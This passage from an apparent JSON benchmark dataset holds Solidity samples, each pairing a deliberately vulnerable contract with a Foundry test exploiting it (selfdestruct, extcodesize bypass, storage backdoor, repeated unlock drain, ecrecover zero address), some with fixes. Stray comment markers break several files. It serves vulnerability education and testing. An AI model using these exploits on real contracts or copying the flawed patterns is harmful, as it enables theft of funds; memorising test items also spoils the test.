);\n        console.log(\"Multiply before dividing is correct. 80*90/100=72\");\n    }\n}\n\ncontract Miscalculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price / 100) * discount; // wrong calculation\n    }\n}\n\ncontract Calculation {\n    function price(\n        uint256 price,\n        uint256 discount\n    ) public pure returns (uint256) {\n        return (price * discount) / 100; // correct calculation\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0016",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Force ForceContract;\n    Attack AttackerContract;\n\n    function testselfdestruct2() public {\n        ForceContract = new Force();\n        console.log(\"Balance of ForceContract:\", address(ForceContract).balance);\n        AttackerContract = new Attack();\n        console.log(\n            \"Balance of ForceContract:\",\n            address(ForceContract).balance\n        );\n        console.log(\n            \"Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack{value: 1 ether}(address(ForceContract));\n\n        console.log(\"Exploit completed\");\n        console.log(\n            \"Balance of EtherGameContract:\",\n            address(ForceContract).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract Force {\n*/\n}\n\ncontract Attack {\n    function attack(address force) public payable {\n        selfdestruct(payable(force));\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0017",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    GasReimbursement GasReimbursementContract;\n\n    function setUp() public {\n        GasReimbursementContract = new GasReimbursement();\n        vm.deal(address(GasReimbursementContract), 100 ether);\n    }\n\n    function testGasRefund() public {\n        uint balanceBefore = address(this).balance;\n        GasReimbursementContract.executeTransfer(address(this));\n        uint balanceAfter = address(this).balance - tx.gasprice; // --gas-price 200000000000000\n        console.log(\"Profit\", balanceAfter - balanceBefore);\n    }\n\n    receive() external payable {}\n}\n\ncontract GasReimbursement {\n    uint public gasUsed = 100000; // Assume gas used is 100,000\n    uint public GAS_OVERHEAD_NATIVE = 500; // Assume native token gas overhead is 500\n\n    // uint public txGasPrice = 20000000000;  // Assume transaction gas price is 20 gwei\n\n    function calculateTotalFee() public view returns (uint) {\n        uint256 totalFee = (gasUsed + GAS_OVERHEAD_NATIVE) * tx.gasprice;\n        return totalFee;\n    }\n\n    function executeTransfer(address recipient) public {\n        uint256 totalFee = calculateTotalFee();\n        _nativeTransferExec(recipient, totalFee);\n    }\n\n    function _nativeTransferExec(address recipient, uint256 amount) internal {\n        payable(recipient).transfer(amount);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0018",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    ArrayDeletionBug ArrayDeletionBugContract;\n    FixedArrayDeletion FixedArrayDeletionContract;\n\n    function setUp() public {\n        ArrayDeletionBugContract = new ArrayDeletionBug();\n        FixedArrayDeletionContract = new FixedArrayDeletion();\n    }\n\n    function testArrayDeletion() public {\n        ArrayDeletionBugContract.myArray(1);\n        //delete incorrectly\n        ArrayDeletionBugContract.deleteElement(1);\n        ArrayDeletionBugContract.myArray(1);\n        ArrayDeletionBugContract.getLength();\n    }\n\n    function testFixedArrayDeletion() public {\n        FixedArrayDeletionContract.myArray(1);\n        //delete incorrectly\n        FixedArrayDeletionContract.deleteElement(1);\n        FixedArrayDeletionContract.myArray(1);\n        FixedArrayDeletionContract.getLength();\n    }\n\n    receive() external payable {}\n}\n\ncontract ArrayDeletionBug {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n        delete myArray[index];\n    }\n\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n\ncontract FixedArrayDeletion {\n    uint[] public myArray = [1, 2, 3, 4, 5];\n\n    //Mitigation 1: By copying the last element and placing it in the position to be removed.\n    function deleteElement(uint index) external {\n        require(index < myArray.length, \"Invalid index\");\n\n        // Swap the element to be deleted with the last element\n        myArray[index] = myArray[myArray.length - 1];\n\n        // Delete the last element\n        myArray.pop();\n    }\n\n    */\n    function getLength() public view returns (uint) {\n        return myArray.length;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0019",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\n\ncontract SimpleVault {\n    // mint function\n    function mint(uint256 amountToDeposit) external returns (uint256) {\n        // Write vault address (address(this)) to transient storage\n        address vault = address(this);\n        assembly {\n            tstore(1, vault)\n        }\n        \n        // Directly call own callback function\n        this.SwapCallback(amountToDeposit, \"\");\n        \n    }\n    \n    // Simulate SwapCallback callback function\n    function SwapCallback(uint256 amount ,bytes calldata data) external {\n        // Read vault address from transient storage\n        address vault;\n        assembly {\n            vault := tload(1)\n        }\n\n        // Check if caller is a legitimate vault\n        require(msg.sender == vault, \"Not authorized\");\n        \n        if (vault == address(this)) {\n            // Output vault address for observation\n            console.log(\"vault address:\", vault);\n            // Write the returned amount to transient storage\n            assembly {\n                tstore(1, amount)\n            }\n        } else {\n            console.log(\"Manipulated vault address:\", vault);\n        }\n    }\n\n}\n\ncontract TransientStorageMisuseTest is Test {\n    SimpleVault vault;\n    \n    function setUp() public {\n        vault = new SimpleVault();\n    }\n\n\n    function testStorageExploit() public {\n        // First, let's check what address we want to get\n        console.log(\"Target address:\", address(this));\n        \n        // Convert the address to uint256\n        uint256 amount = uint256(uint160(address(this)));\n        emit log_named_uint(\"Amount needed\", amount);\n        \n        // Now use this amount in the mint function\n        vault.mint(amount);\n        // Exploit callback\n        vault.SwapCallback(0, \"\");\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0020",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Target TargetContract;\n    FailedAttack FailedAttackContract;\n    Attack AttackerContract;\n    TargetRemediated TargetRemediatedContract;\n\n    constructor() {\n        TargetContract = new Target();\n        FailedAttackContract = new FailedAttack();\n        TargetRemediatedContract = new TargetRemediated();\n    }\n\n    function testBypassFailedContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit Failed\");\n        FailedAttackContract.pwn(address(TargetContract));\n    }\n\n    function testBypassContractCheck() public {\n        console.log(\n            \"Before exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        AttackerContract = new Attack(address(TargetContract));\n        console.log(\n            \"After exploiting, protected status of TargetContract:\",\n            TargetContract.pwned()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract Target {\n    function isContract(address account) public view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n\ncontract FailedAttack is Test {\n    // Attempting to call Target.protected will fail,\n    // Target block calls from contract\n    function pwn(address _target) external {\n        // This will fail\n        vm.expectRevert(\"no contract allowed\");\n        Target(_target).protected();\n    }\n}\n\ncontract Attack {\n    bool public isContract;\n    address public addr;\n\n    // When contract is being created, code size (extcodesize) is 0.\n    // This will bypass the isContract() check\n    constructor(address _target) {\n        isContract = Target(_target).isContract(address(this));\n        addr = address(this);\n        // This will work\n        Target(_target).protected();\n    }\n}\n\ncontract TargetRemediated {\n    function isContract(address account) public view returns (bool) {\n        require(tx.origin == msg.sender);\n        return account.code.length > 0;\n    }\n\n    bool public pwned = false;\n\n    function protected() external {\n        require(!isContract(msg.sender), \"no contract allowed\");\n        pwned = true;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0021",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    LotteryGame LotteryGameContract;\n\n    function testBackdoorCall() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        LotteryGameContract = new LotteryGame();\n        console.log(\n            \"Alice performs pickWinner, of course she will not be a winner\"\n        );\n        vm.prank(alice);\n        LotteryGameContract.pickWinner(address(alice));\n        console.log(\"Prize: \", LotteryGameContract.prize());\n\n        console.log(\"Now, admin sets the winner to drain out the prize.\");\n        LotteryGameContract.pickWinner(address(bob));\n        console.log(\"Admin manipulated winner: \", LotteryGameContract.winner());\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract LotteryGame {\n    uint256 public prize = 1000;\n    address public winner;\n    address public admin = msg.sender;\n\n    modifier safeCheck() {\n        if (msg.sender == referee()) {\n            _;\n        } else {\n            getkWinner();\n        }\n    }\n\n    function referee() internal view returns (address user) {\n        assembly {\n            // load admin value at slot 2 of storage\n            user := sload(2)\n        }\n    }\n\n    function pickWinner(address random) public safeCheck {\n        assembly {\n            // admin backddoor which can set winner address\n            sstore(1, random)\n        }\n    }\n\n    function getkWinner() public view returns (address) {\n        console.log(\"Current winner: \", winner);\n        return winner;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0022",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    VulnerableBank VulnerableBankContract;\n    BanksLP BanksLPContract;\n    FixedeBank FixedeBankContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        VulnerableBankContract = new VulnerableBank();\n        FixedeBankContract = new FixedeBank();\n        BanksLPContract = new BanksLP();\n        BanksLPContract.transfer(address(alice), 10000);\n        BanksLPContract.transfer(address(VulnerableBankContract), 100000);\n    }\n\n    function testVulnerableBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(VulnerableBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        VulnerableBankContract.createLocker(\n            address(BanksLPContract),\n            10000,\n            86400\n        );\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //vm.warp(88888);\n        for (uint i = 0; i < 10; i++) {\n            VulnerableBankContract.unlockToken(1);\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n\n    function testFixedBank() public {\n        //In foundry, default timestamp is 1.\n        console.log(\"Current timestamp\", block.timestamp);\n        vm.startPrank(alice);\n        BanksLPContract.approve(address(FixedeBankContract), 10000);\n        console.log(\n            \"Before locking, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        //lock 10000 for a day\n        FixedeBankContract.createLocker(address(BanksLPContract), 10000, 86400);\n        console.log(\n            \"Before exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n        for (uint i = 0; i < 10; i++) {\n            {\n                vm.expectRevert();\n                FixedeBankContract.unlockToken(1);\n            }\n        }\n        console.log(\n            \"After exploiting, my BanksLP balance\",\n            BanksLPContract.balanceOf(address(alice))\n        );\n    }\n}\n\ncontract VulnerableBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n        require(locker.hasLockedTokens, \"No locked tokens\");\n\n        // Incorrect sanity checks.\n        if (block.timestamp > locker.lockTime) {\n            locker.amount = 0;\n        }\n\n        // Transfer tokens to the locker owner\n        // before the lock time has elapsed.\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n\ncontract BanksLP is ERC20, Ownable {\n    constructor() ERC20(\"BanksLP\", \"BanksLP\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n\n    function mint(address to, uint256 amount) public onlyOwner {\n        _mint(to, amount);\n    }\n}\n\ncontract FixedeBank {\n    struct Locker {\n        bool hasLockedTokens;\n        uint256 amount;\n        uint256 lockTime;\n        address tokenAddress;\n    }\n\n    mapping(address => mapping(uint256 => Locker)) private _unlockToken;\n    uint256 private _nextLockerId = 1;\n\n    function createLocker(\n        address tokenAddress,\n        uint256 amount,\n        uint256 lockTime\n    ) public {\n        require(amount > 0, \"Amount must be greater than 0\");\n        require(lockTime > block.timestamp, \"Lock time must be in the future\");\n        require(\n            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,\n            \"Insufficient token balance\"\n        );\n\n        // Transfer the tokens to this contract\n        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);\n\n        // Create the locker\n        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];\n        locker.hasLockedTokens = true;\n        locker.amount = amount;\n        locker.lockTime = lockTime;\n        locker.tokenAddress = tokenAddress;\n\n        _nextLockerId++;\n    }\n\n    function unlockToken(uint256 lockerId) public {\n        Locker storage locker = _unlockToken[msg.sender][lockerId];\n\n        require(locker.hasLockedTokens, \"No locked tokens\");\n        require(block.timestamp > locker.lockTime, \"Tokens are still locked\");\n        // Save the amount to a local variable\n        uint256 amount = locker.amount;\n\n        // Mark the tokens as unlocked\n        locker.hasLockedTokens = false;\n        locker.amount = 0;\n\n        // Transfer tokens to the locker owner\n        IERC20(locker.tokenAddress).transfer(msg.sender, amount);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0023",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    using SafeERC20 for IERC20;\n    IERC20 constant zrx = IERC20(0xE41d2489571d322189246DaFA5ebDe1F4699F498);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 16138254);\n    }\n\n    function testTransfer() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n        zrx.transfer(address(this), 123); //return false, do not revert\n        vm.stopPrank();\n    }\n\n    function testSafeTransferFail() public {\n        vm.startPrank(0xef0DCc839c1490cEbC7209BAa11f46cfe83805ab);\n\n        // https://github.com/foundry-rs/foundry/issues/5367 can't vm.expectRevert\n        // vm.expectRevert(\"SafeERC20: ERC20 operation did not succeed\");\n        zrx.safeTransfer(address(this), 123); //revert\n\n        vm.stopPrank();\n    }\n\n    receive() external payable {}\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0024",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testecRecover() public {\n        emit log_named_decimal_uint(\n            \"Before exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n        bytes32 _hash = keccak256(\n            abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\")\n        );\n        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);\n\n        // If v value isn't 27 or 28. it will return address(0)\n        uint8 v = 29;\n        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);\n\n        emit log_named_decimal_uint(\n            \"After exploiting, my balance\",\n            SimpleBankContract.getBalance(address(this)),\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private balances;\n    address Admin; //default is address(0)\n\n    function getBalance(address _account) public view returns (uint256) {\n        return balances[_account];\n    }\n\n    function recoverSignerAddress(\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) private pure returns (address) {\n        address recoveredAddress = ecrecover(_hash, _v, _r, _s);\n        return recoveredAddress;\n    }\n\n    function transfer(\n        address _to,\n        uint256 _amount,\n        bytes32 _hash,\n        uint8 _v,\n        bytes32 _r,\n        bytes32 _s\n    ) public {\n        require(_to != address(0), \"Invalid recipient address\");\n\n        address signer = recoverSignerAddress(_hash, _v, _r, _s);\n        console.log(\"signer\", signer);\n        //Mitigation\n        //require(signer != address(0), \"Invalid signature\");\n        require(signer == Admin, \"Invalid signature\");\n\n        balances[_to] += _amount;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  }
]